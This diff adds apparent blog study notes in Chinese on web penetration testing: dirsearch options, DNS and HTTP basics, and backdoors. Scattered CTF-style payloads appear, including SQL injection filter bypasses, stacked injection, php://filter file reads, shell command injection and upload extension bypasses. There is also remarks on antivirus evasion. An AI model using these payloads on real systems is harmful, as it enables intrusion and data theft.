@@ -250,4 +250,904 @@
         <tag>Linux</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Web渗透测试学习笔记</title>
+    <url>/2025/01/01/Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h1><h2 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h2><p>常见Payload<br>	   1.扫描单个URL，并限制线程数和扩展名：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -t 10 -e php,asp --exclude-extensions=html</span><br></pre></td></tr></table></figure>
+
+<p>该命令将对 <a href="http://example.com/">http://example.com</a> 进行目录扫描，使用最多 10 个线程并仅检查扩展名为 php 和 asp 的路径，同时排除扩展名为 html 的路径。</p>
+<p>2.从URL列表文件中批量扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -l urls.txt -t 5 -e php</span><br></pre></td></tr></table></figure>
+
+<p>该命令将从 urls.txt 文件中读取目标URL列表，并使用最多 5 个线程对每个URL进行目录扫描，仅检查扩展名为 php 的路径。</p>
+<p>3.使用自定义字典和深度递归扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -w custom-wordlist.txt -r --deep-recursive</span><br></pre></td></tr></table></figure>
+
+<p>该命令将对 <a href="http://example.com/">http://example.com</a> 进行目录扫描，使用自定义的单词列表文件 custom-wordlist.txt，并启用深度递归扫描，即在每个目录的所有深度上执行递归扫描。</p>
+<p>4.在请求中使用自定义HTTP头：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -H &quot;X-Custom-Header: Value&quot; -H &quot;Authorization: Bearer token&quot;</span><br></pre></td></tr></table></figure>
+
+<p>该命令将对 <a href="http://example.com/">http://example.com</a> 进行目录扫描，并在每个请求中包含自定义的HTTP头，如 X-Custom-Header 和 Authorization。</p>
+<p>5.指定线程数和延迟时间：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -t 20 --delay 0.5</span><br></pre></td></tr></table></figure>
+
+<p>上述命令将使用20个线程并设置每个请求之间的延迟为0.5秒。</p>
+<p>6.使用自定义的请求头和超时时间：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -H &quot;Custom-Header: value&quot; --timeout 10</span><br></pre></td></tr></table></figure>
+
+<p>这个命令将在每个请求中添加一个自定义的请求头 “Custom-Header: value”，并将超时时间设置为10秒。</p>
+<p>7.包含和排除特定状态码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -i 200,302 -x 404,500</span><br></pre></td></tr></table></figure>
+
+<p>上述命令将只包含状态码为200和302的响应，并排除状态码为404和500的响应。</p>
+<p>8.使用代理进行扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -p http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+<p>这个命令将通过指定的HTTP代理（例如Burp Suite）对目标URL进行扫描。</p>
+<p>9.保存输出到文件中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -o output.txt</span><br></pre></td></tr></table></figure>
+
+<p>上述命令将扫描结果输出到指定的文件 output.txt。</p>
+<p>10.使用代理链进行扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -p http://proxy1:8080 -p http://proxy2:8080</span><br></pre></td></tr></table></figure>
+
+<p>上述命令将通过两个代理服务器 proxy1 和 proxy2 进行目标URL的扫描。</p>
+<p>11.从标准输入读取URL：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat urls.txt | python dirsearch.py --stdin -t 10</span><br></pre></td></tr></table></figure>
+
+<p>这个命令通过管道从 urls.txt 中读取URL，并使用最多 10 个线程对每个URL进行目录扫描。</p>
+<p>12.启用递归扫描和重定向跟随：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -r -F</span><br></pre></td></tr></table></figure>
+
+<p>上述命令将启用目录的递归扫描，并且在扫描时跟随HTTP重定向。</p>
+<p>13.排除指定大小范围的响应：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com --exclude-sizes 0-100B,500KB-1MB</span><br></pre></td></tr></table></figure>
+
+<p>该命令将排除大小在 0 到 100 字节以及 500千字节到 1 兆字节范围内的响应。</p>
+<p>14.设定最大运行时间和最大重试次数：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com --max-time 300 --retries 5</span><br></pre></td></tr></table></figure>
+
+<p>上述命令将设置最长运行时间为 300 秒，并允许失败请求最多重试 5 次。</p>
+<p>15.指定自定义的User-Agent头：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com --user-agent &quot;Custom User Agent&quot;</span><br></pre></td></tr></table></figure>
+
+
+<p>上述命令将在HTTP请求中指定自定义的User-Agent头。</p>
+<p>16.使用代理认证进行扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -p http://proxy.example.com --proxy-auth &quot;username:password&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这个命令将使用指定的代理服务器 proxy.example.com 进行扫描，并提供代理认证的用户名和密码。</p>
+<p>17.启用递归扫描并限制最大递归深度：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -r -R 5</span><br></pre></td></tr></table></figure>
+
+<p>上述命令将启用递归目录扫描，并限制最大递归深度为5层。</p>
+<p>18.排除特定文本出现的响应：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com --exclude-text &quot;Not Found&quot; --exclude-text &quot;Error&quot;</span><br></pre></td></tr></table></figure>
+
+
+<p>该命令将排除响应中包含指定文本（如 “Not Found” 和 “Error”）的路径。</p>
+<p>19.设置最小和最大响应长度：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com --min-response-size 1000 --max-response-size 50000</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查字段值：1’ ununionion selselectect 1,2,flag frfromom ctf.Flag#</p>
+<p>查表名：1’ ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;‘ctf’#</p>
+<p>查数据库名：1’ ununionion selselectect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata #</p>
+<p>双写绕过：1’ ununionion selselectect 1,2,3#</p>
+<p>接下来爆字段位置，输入1’ union select 1,2,3#，发现过滤</p>
+<p>使用双写绕过1’ oorrder bbyy 1#，得到字段数为3</p>
+<p>绕过后缀的有文件格式有php,php3,php4,php5,phtml.pht，这些后缀名都可以被当做php文件执行(需要配置文件里面的支持)</p>
+<p>1、例如Apache的 httpd.conf 中有如下配置代码：</p>
+<p>AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht</p>
+<p>2、或者.htaccess文件内容：</p>
+<p>SetHandler application&#x2F;x-httpd-php</p>
+<p>意思是设置当前所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当做PHP执行。不符合则报错。</p>
+<p>phtml一般是指嵌入了php代码的html文件，但是同样也会作为php解析</p>
+<p>PHT文件是一个HTML页面，其中包括一个PHP脚本<br>		最后还得访问这个文件：一般文件上传后都会放在url&#x2F;upload&#x2F;文件名</p>
+<h2 id="hackbar插件"><a href="#hackbar插件" class="headerlink" title="hackbar插件"></a>hackbar插件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	Load URL（加载网址）:将网址“框”下来</span><br><span class="line">Split URL（切分网址）：自动切分网址，便于快速找出需要修的地方</span><br><span class="line">Execute（执行）：相当于F5</span><br></pre></td></tr></table></figure>
+
+<p>在SQL中，分号（;）是用来表示一条sql语句的结束</p>
+<p>构造select * from Flag这样的语句，其中星号（<em>）用来代替其他字段，SELECT语句会返回数据表的所有字段值，然而当我们直接传递</em>的时候却没有任何回显信息收集部分</p>
+<p>flag 就藏在 flag.php 文件中，所以推测采用的是 PHP 伪协议：<strong>php:&#x2F;&#x2F;filter – 对本地磁盘文件进行读写</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"># (base64解密就可以看到内容，这里如果不进行base64_encode，则被include进来的代码就会被执行，导致看不到源代码)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1|cat$IFS$9index.php</span><br><span class="line"> </span><br><span class="line"># $IFS是一个环境变量，用于设置shell中的字段分隔符。在这里，它被用作特殊字符</span><br><span class="line"># $9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串</span><br></pre></td></tr></table></figure>
+
+<p>查询数据库名，输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1’ union select 1,2#</span><br></pre></td></tr></table></figure>
+
+<p>测试字段数，测试到 3 时报错，说明只有两个字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 1 #    </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3 #    </span><br></pre></td></tr></table></figure>
+
+<p>直接堆叠注入爆破数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27;;show databases;#</span><br></pre></td></tr></table></figure>
+
+<p> 查看words，输入输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1’; show columns from `words`; #</span><br></pre></td></tr></table></figure>
+
+<p>查看表，输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1’;show tables;#</span><br></pre></td></tr></table></figure>
+
+<p>发现flag，因为查看flag的回显会出现在words里，为了回显在flag所属的表，而发现alter、rename又没有被过滤，则试着进行表和字段的重命名输入</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>’;rename table words to word;rename table <span class="number">1919810931114514</span> to words;alter table words change flag id <span class="title function_ invoke__">varchar</span>(<span class="number">100</span>);show columns <span class="keyword">from</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>联合查询</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,3# </span></span><br></pre></td></tr></table></figure>
+
+<p>查询数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1’ union select 1,2,database()#</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x00-堆叠注入定义"><a href="#0x00-堆叠注入定义" class="headerlink" title="0x00 堆叠注入定义"></a>0x00 堆叠注入定义</h3><p>   Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是<a href="https://so.csdn.net/so/search?q=%E5%91%BD%E4%BB%A4%E8%A1%8C&spm=1001.2101.3001.7020">命令行</a>中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>
+<h3 id="0x01-堆叠注入原理"><a href="#0x01-堆叠注入原理" class="headerlink" title="0x01 堆叠注入原理"></a>0x01 堆叠注入原理</h3><p>   在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<h3 id="0x02-堆叠注入的局限性"><a href="#0x02-堆叠注入的局限性" class="headerlink" title="0x02 堆叠注入的局限性"></a>0x02 堆叠注入的局限性</h3><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/22bf4238a39dbe63e5309caba562ba5a.gif" alt="img" loading="lazy"></p>
+<p>此图是从原文中截取过来的，因为我个人的测试环境是php+mysql，是可以执行的，此处对于mysql&#x2F;php存在质疑。但个人估计原文作者可能与我的版本的不同的原因。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
+<h2 id="Day1-概念名词"><a href="#Day1-概念名词" class="headerlink" title="Day1 概念名词"></a>Day1 概念名词</h2><h3 id="1、域名"><a href="#1、域名" class="headerlink" title="1、域名"></a>1、域名</h3><ol>
+<li>什么是域名?</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">相当于网站的名字维基百科对域名的解释是：互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。</span><br><span class="line">网域名称系统（Domain Name System）有时也简称为域名（DNS），是互联网的一项核心服务，它作为可以将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网，而不用去记住能够被机器直接读取的 IP 地址数据串。</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>域名在哪里注册?</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.Godaddy</span><br><span class="line">2.Gandi</span><br><span class="line">3.Hover</span><br><span class="line">4.Namesilo</span><br><span class="line">5.Namecheap</span><br><span class="line">6.万网</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>什么是二级域名多级域名?</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.顶级域名:又叫一级域名,一串字符串中间一个点隔开,例如baidu.com。顶级域名是互联网DNS等级之中的最高级的域,它保存于DNS根域的名字空间中。</span><br><span class="line">2.二级域名:实际上就是一个一级域名以下的主机名,一串字符串中间两个“.”隔开,例如www.baidu.com。二级域名就是最靠近顶级域名左侧的字段。</span><br><span class="line">3.三级域名:二级域名的子域名,特征是包含三个“.”,例如___.___.baidu.com...</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>域名发现对于安全测试意义?</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">进行渗透测试时，其主域名找不到漏洞时，就可以尝试去测试收集到的子域名，有可能测试子域名网站时会有意向不到的效果，然后可以由此横向到主网站。</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、DNS"><a href="#2、DNS" class="headerlink" title="2、DNS"></a>2、DNS</h3><ol>
+<li>什么是DNS?</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">域名系统(Domain Name System,DNS)是Internet上解决网上机器命名的一种系统。 就像拜访朋友要先知道别人家怎么走一样，Internet上当一台主机要访问另外一台主机时，必须首先获知其地址，TCP/IP中的IP地址是由四段以“.”分开的数字组成(此处以IPv4的地址为例，IPv6的地址同理)，记起来总是不如名字那么方便，所以，就采用了域名系统来管理名字和IP的对应关系。</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>本地Hosts与DNS的关系?</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hosts文件主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。</span><br><span class="line">Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</span><br><span class="line">浏览器访问网站，要首先通过DNS服务器把要访问的网站域名解析成一个唯一的IP地址，之后，浏览器才能对此网站进行定位并且访问其数据。</span><br></pre></td></tr></table></figure>
+
+<p><strong>如何查看本地Hosts文件：</strong></p>
+<ol>
+<li><p>Win + R：打开运行输入drivers</p>
+</li>
+<li><p>输入：c:\windows\system32\drivers\etc</p>
+</li>
+<li><p>选择使用记事本或者Notepad、Vs Code 等编程软件打开</p>
+</li>
+<li><p>CDN是什么?与DNS的关系?</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CDN的全称是Content DeliveryNetwork，即内容分发网络。</span><br><span class="line">CDN的基本思路：是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。</span><br><span class="line"></span><br><span class="line">通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上（单纯只使用DNS解析，直接PING就会显示出自己的真实IP,如果又使用CDN，PING出来的IP就不是用户的真实IP而是CDN服务器的IP节点。需要绕过CDN后去找真实IP地址。</span><br><span class="line"></span><br><span class="line">使用CDN的目的：是使用户可就近取得所需内容，解决Internet网络拥挤的状况，提高用户访问网站的响应速度。</span><br></pre></td></tr></table></figure>
+
+<p>通过超级ping的网站可以看到CDN的解析情况<a href="https://www.ping.cn/ping/cdivtc.com">https://www.ping.cn/ping/cdivtc.com</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1622341994185-016ce41c-7b63-4999-aa8f-b970a975794b.png" alt="img" loading="lazy"></p>
+<ol>
+<li>常见的DNs安全攻击有哪些?</li>
+</ol>
+<ul>
+<li>DDOS</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DDoS攻击也叫做分布式拒绝服务攻击，可以使很多的计算机在同一时间遭受到攻击，使攻击的目标无法正常使用。攻击者可以伪造自己的DNS服务器地址，同时发送大量请求给其他服务器。其他服务器的回复会被发送到被伪造服务器的真实地址，造成该服务器无法处理请求而崩溃。攻击者同样可以通过利用DNS协议中存在的漏洞，恶意创造一个载荷过大的请求，造成目标DNS服务器崩溃。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DNS缓存中毒：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DNS缓存中毒攻击者给DNS服务器注入非法网络域名地址，如果服务器接受这个非法地址，那说明其缓存就被攻击了，而且以后响应的域名请求将会受黑客所控。当这些非法地址进入服务器缓存，用户的浏览器或者邮件服务器就会自动跳转到DNS指定的地址。这种攻击往往被归类为域欺骗攻击(pharming attack)，由此它会导致出现很多严重问题。首先，用户往往会以为登陆的是自己熟悉的网站，而它们却并不是。与钓鱼攻击采用非法URL不同的是，这种攻击使用的是合法的URL地址。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>域名劫持（DNS重定向）：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">域名劫持是通过攻击域名解析服务器（DNS），或伪造域名解析服务器（DNS）的方法，把目标网站域名解析到错误的地址从而实现用户无法访问目标网站的目的。域名劫持一方面可能影响用户的上网体验，用户被引到假冒的网站进而无法正常浏览网页，而用户量较大的网站域名被劫持后恶劣影响会不断扩大；另一方面用户可能被诱骗到冒牌网站进行登录等操作导致泄露隐私数据。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DNS查询嗅探：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">攻击者主要利用对DNS的配置信息获取网络环境的信息，为之后的攻击做好的准备。</span><br><span class="line"></span><br><span class="line">  针对这些情况，我们需要对DNS服务器需要采取特别的安全保护措施，在防火墙网络中，分开设置内部DNS服务器和外部DNS服务器，连接外部服务的外部DNS服务器上不留有对外禁止访问的内部网络系统的服务器，做到内外网络服务器分割。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>ARP欺骗：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。ARP攻击主要是存在于局域网网络中，局域网中若有一台计算机感染ARP病毒，则感染该ARP病毒的系统将会试图通过”ARP欺骗”手段截获所在网络内其它计算机的通信信息，并因此造成网内其它计算机的通信故障。</span><br><span class="line"></span><br><span class="line">  ARP欺骗通常是在用户局网中，造成用户访问域名的错误指向。如果IDC机房也被ARP病毒入侵后，则也可能出现攻击者采用ARP包压制正常主机、或者压制DNS服务器，以使访问导向错误指向的情况。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>本机劫持：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  本机的计算机系统被木马或流氓软件感染后，也可能会出现部分域名的访问异常。</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、-脚本语言"><a href="#3、-脚本语言" class="headerlink" title="3、 脚本语言"></a>3、 脚本语言</h3><p>常见脚本语言有哪些？</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">一种介乎于 HTML 和诸如 JAVA 、 Visual Basic 、 C++ 等编程语言之间的一种特殊的语言。</span><br><span class="line">尽管它更接近后者，但它却不具有编程语言复杂、严谨的语法和规则。</span><br><span class="line">常见的脚本语言有：Python、JavaScript、Asp (逐渐淘汰，基本都是小站点在使用)、Aspx、Php （目前比较流行）javaweb、 pl、cgi等</span><br></pre></td></tr></table></figure>
+
+<p>\2. 不同脚本类型与安全漏洞的关系？</p>
+<ul>
+<li>不同的脚本语言的编写规则不一样，程序产生的漏洞自然也不一样（代码审计）。</li>
+</ul>
+<p>\3. 漏洞挖掘代码审计与脚本类型的关系？</p>
+<ul>
+<li>漏洞挖掘代码审计：要熟悉相关代码和相关逻辑机制</li>
+</ul>
+<h3 id="4、后门"><a href="#4、后门" class="headerlink" title="4、后门"></a>4、后门</h3><ol>
+<li>什么是后门?有那些后门?</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在信息安全领域，后门是指绕过安全控制而获取对程序或系统访问权的方法。</span><br><span class="line">后门的最主要目的就是方便以后再次秘密进入或者控制系统。</span><br></pre></td></tr></table></figure>
+
+<p>后门的分类</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.网页后门 ：</span><br><span class="line">   </span><br><span class="line"> 		此类后门程序一般都是服务器上正常 的web服务来构造自己的连接方式，比如现在非常流行的ASP、cgi脚本后门等。</span><br><span class="line">    </span><br><span class="line">2.线程插入后门：</span><br><span class="line">   		利用系统自身的某个服务或者线程，将后门程序插入到其中，具体原理原来《黑客防线》曾具体讲解过，感兴趣的朋友可以查阅。这也是现在最流行的一个后门技术。</span><br><span class="line">      </span><br><span class="line">3.扩展后门：</span><br><span class="line">   		所谓的“扩展”，是指在功能上有大的提升，比普通的单一功能的后门有很强的使用性，这种后门本身就相当于一个小的安全工具包，能实现非常多的常驻见安全功能，适合新手使用————但是，功能越强，个人觉得反而脱郭后门“隐蔽”的初衷，具体看法就看各位使用都的喜好了。</span><br><span class="line">      </span><br><span class="line">4.C/S后门（客户端服务器后门）：</span><br><span class="line">   		和传统的木马程序类似的控制方法，采用“客记端/服务端”的控制方式，通过某种特定的访问方式来启动后门进而控制服务器。</span><br></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li>后门在安全测试中的实际意义?</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">方便下次更方便的进来。</span><br><span class="line"></span><br><span class="line">获取到相关权限之后，后门相当于一个管道，便于操作。</span><br><span class="line"></span><br><span class="line">即使管理员通过改变所有密码之类的方法来提高安全性，仍然能再次侵入，使再次侵入被发现的可能性减至最低。</span><br><span class="line"></span><br><span class="line">大多数后门设法躲过日志，大多数情况下即使入侵者正在使用系统也无法显示他已在线。</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>关于后门需要了解那些?(玩法，免杀)</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">玩法（创建后门之后我们可以怎么样操作？）</span><br><span class="line">  网站后门：便于控制网站</span><br><span class="line">  软件后门：用于控制</span><br><span class="line">  服务器后门：可以进行脱库、盗取信息</span><br><span class="line">  </span><br><span class="line">免杀技术全称为反杀毒技术Anti Anti-Virus简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。</span><br><span class="line">由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。</span><br><span class="line">其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。</span><br><span class="line"></span><br><span class="line">后门需要掌握的核心技能，防止杀毒软件检查到</span><br></pre></td></tr></table></figure>
+
+<h3 id="5、web"><a href="#5、web" class="headerlink" title="5、web"></a>5、web</h3><ol>
+<li>web的组成框架模型？</li>
+</ol>
+<ul>
+<li>WEB的组成框架模型：网站原码、操作系统、中间件（搭建平台，提供服务的）、数据库。</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1622344095127-d9d0947b-81bf-401b-a94e-bdacc95887df.png" alt="img" loading="lazy"></p>
+<ol>
+<li>架构漏洞安全测试的简要测试</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">通信层</span><br><span class="line">		主要测试通信协议的安全，系统开放的端口，其中操作系统提供网络层和数据链路层协议，存在问题的可能性较小，一般关注开源协议已存在漏洞即可，无需重点关注。应用层服务与协议一般由产品形态决定，产品中可以自定义配置相关协议与参数，需要重点关注与测试。</span><br><span class="line">    </span><br><span class="line">应用层</span><br><span class="line">	应用层包含开发人员开发代码，为整个安全测试的核心模块。主要包括web安全测试，源码安全测试。其中web安全测试从web访问服务的维度，偏向黑盒，进行安全测试。源码安全测试从代码的维度，偏向白盒，进行安全测试。</span><br><span class="line">  </span><br><span class="line">系统层</span><br><span class="line">	主要测试操作系统安全，数据库服务安全，web服务器安全，以及其他一些中间件的安全。</span><br><span class="line">  </span><br><span class="line">管理层</span><br><span class="line">	主要包括产品资料的安全测试，安全策略制定，协调各个层面的安全测试以及安全风险的整体评估。</span><br></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li>为什么要从web界面为主</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">因为web使用方面广 。</span><br><span class="line"></span><br><span class="line">从WEB方向先入手，一步一步的获取最高权限。</span><br></pre></td></tr></table></figure>
+
+<h3 id="6、web相关漏洞"><a href="#6、web相关漏洞" class="headerlink" title="6、web相关漏洞"></a>6、web相关漏洞</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623556578495-5a065dfe-3000-4bf3-b59f-ccc5acf2d6b8.png" alt="img" loading="lazy"></p>
+<h2 id="Day2-数据包拓展"><a href="#Day2-数据包拓展" class="headerlink" title="Day2 数据包拓展"></a>Day2 数据包拓展</h2><h3 id="1、http-https数据包"><a href="#1、http-https数据包" class="headerlink" title="1、http&#x2F;https数据包"></a>1、http&#x2F;https数据包</h3><h4 id="●HTTP协议是什么？"><a href="#●HTTP协议是什么？" class="headerlink" title="●HTTP协议是什么？"></a>●HTTP协议是什么？</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP协议是超文本传输协议的缩写，英文是Hyper Text Transfer Protocol。它是从WEB服务器传输超文本标记语言(HTML)到本地浏览器的传送协议。</span><br><span class="line">设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法。</span><br><span class="line">HTPP有多个版本，目前广泛使用的是HTTP/1.1版本。</span><br></pre></td></tr></table></figure>
+
+<h4 id="●-HTTP原理"><a href="#●-HTTP原理" class="headerlink" title="**●**HTTP原理"></a>**●**HTTP原理</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP是一个基于TCP/IP通信协议来传递数据的协议，传输的数据类型为HTML 文件,、图片文件, 查询结果等。</span><br><span class="line">HTTP协议一般用于B/S架构（）。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。</span><br></pre></td></tr></table></figure>
+
